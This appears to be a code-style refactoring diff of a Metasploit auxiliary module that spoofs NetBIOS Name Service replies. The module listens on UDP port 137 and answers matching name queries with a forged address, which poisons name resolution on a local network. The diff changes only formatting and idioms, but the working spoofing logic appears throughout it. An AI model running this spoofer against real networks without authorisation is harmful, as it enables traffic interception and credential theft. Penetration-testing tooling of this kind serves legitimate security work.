@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,11 +7,9 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Capture
 
   attr_accessor :sock, :thread
-
 
   def initialize
     super(
@@ -42,9 +41,9 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", "127.0.0.1"]),
-      OptRegexp.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*']),
-    ])
+                       OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", "127.0.0.1"]),
+                       OptRegexp.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*'])
+                     ])
 
     deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
     self.thread = nil
@@ -56,16 +55,14 @@ class MetasploitModule < Msf::Auxiliary
     # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
     # addr like "::ffff:192.168.0.1" when the interface we're listening
     # on has an IPv6 address. Convert it to just the v4 addr
-    if rhost.ipv4_mapped?
-      rhost = rhost.native
-    end
+    rhost = rhost.native if rhost.ipv4_mapped?
 
     # Convert to string
     rhost = rhost.to_s
 
     spoof = ::IPAddr.new(datastore['SPOOFIP'])
 
-    return if packet.length == 0
+    return if packet.empty?
 
     nbnsq_transid      = packet[0..1]
     nbnsq_flags        = packet[2..3]
@@ -76,9 +73,9 @@ class MetasploitModule < Msf::Auxiliary
     nbnsq_name         = packet[12..45]
     decoded = ""
     nbnsq_name.slice(1..-2).each_byte do |c|
-      decoded << "#{(c - 65).to_s(16)}"
+      decoded << (c - 65).to_s(16).to_s
     end
-    nbnsq_decodedname = "#{[decoded].pack('H*')}".strip()
+    nbnsq_decodedname = [decoded].pack('H*').to_s.strip
     nbnsq_type         = packet[46..47]
     nbnsq_class        = packet[48..49]
 
@@ -101,18 +98,18 @@ class MetasploitModule < Msf::Auxiliary
 
     # time to build a response packet - Oh YEAH!
     response = nbnsq_transid +
-      "\x85\x00" + # Flags = response + authoratative + recursion desired +
-      "\x00\x00" + # Questions = 0
-      "\x00\x01" + # Answer RRs = 1
-      "\x00\x00" + # Authority RRs = 0
-      "\x00\x00" + # Additional RRs = 0
-      nbnsq_name + # original query name
-      nbnsq_type + # Type = NB ...whatever that means
-      nbnsq_class+ # Class = IN
-      "\x00\x04\x93\xe0" + # TTL = a long ass time
-      "\x00\x06" + # Datalength = 6
-      "\x00\x00" + # Flags B-node, unique = whatever that means
-      spoof.hton
+               "\x85\x00" + # Flags = response + authoratative + recursion desired +
+               "\x00\x00" + # Questions = 0
+               "\x00\x01" + # Answer RRs = 1
+               "\x00\x00" + # Authority RRs = 0
+               "\x00\x00" + # Additional RRs = 0
+               nbnsq_name + # original query name
+               nbnsq_type + # Type = NB ...whatever that means
+               nbnsq_class + # Class = IN
+               "\x00\x04\x93\xe0" + # TTL = a long ass time
+               "\x00\x06" + # Datalength = 6
+               "\x00\x00" + # Flags B-node, unique = whatever that means
+               spoof.hton
 
     pkt = PacketFu::UDPPacket.new
     pkt.ip_saddr = Rex::Socket.source_address(rhost)
@@ -127,56 +124,55 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def monitor_socket
-    while true
-      rds = [self.sock]
+    loop do
+      rds = [sock]
       wds = []
-      eds = [self.sock]
+      eds = [sock]
 
-      r,_,_ = ::IO.select(rds,wds,eds,0.25)
-      if (r != nil and r[0] == self.sock)
-        packet, host, port = self.sock.recvfrom(65535)
+      r, = ::IO.select(rds, wds, eds, 0.25)
+      if !r.nil? && (r[0] == sock)
+        packet, host, port = sock.recvfrom(65535)
         dispatch_request(packet, host, port)
       end
     end
   end
 
   def run
-    check_pcaprub_loaded()
-    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround
+    check_pcaprub_loaded
+    ::Socket.do_not_reverse_lookup = true # Mac OS X workaround
 
     # Avoid receiving extraneous traffic on our send socket
-    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})
+    open_pcap('FILTER' => 'ether host f0:f0:f0:f0:f0:f0')
 
     self.sock = Rex::Socket.create_udp(
       'LocalHost' => "0.0.0.0",
       'LocalPort' => 137,
       'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
     )
-    add_socket(self.sock)
-    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
+    add_socket(sock)
+    sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
 
     self.thread = Rex::ThreadFactory.spawn("NBNSServerMonitor", false) {
       begin
         monitor_socket
       rescue ::Interrupt
-        raise $!
+        raise $ERROR_INFO
       rescue ::Exception
-        print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
+        print_error("Error: #{$ERROR_INFO.class} #{$ERROR_INFO} #{$ERROR_INFO.backtrace}")
       end
     }
 
     print_status("NBNS Spoofer started. Listening for NBNS requests with REGEX \"#{datastore['REGEX'].source}\" ...")
 
-    self.thread.join
+    thread.join
     print_status("NBNS Monitor thread exited...")
   end
 
   def cleanup
-    if self.thread and self.thread.alive?
-      self.thread.kill
+    if thread && thread.alive?
+      thread.kill
       self.thread = nil
     end
     close_pcap
   end
-
 end
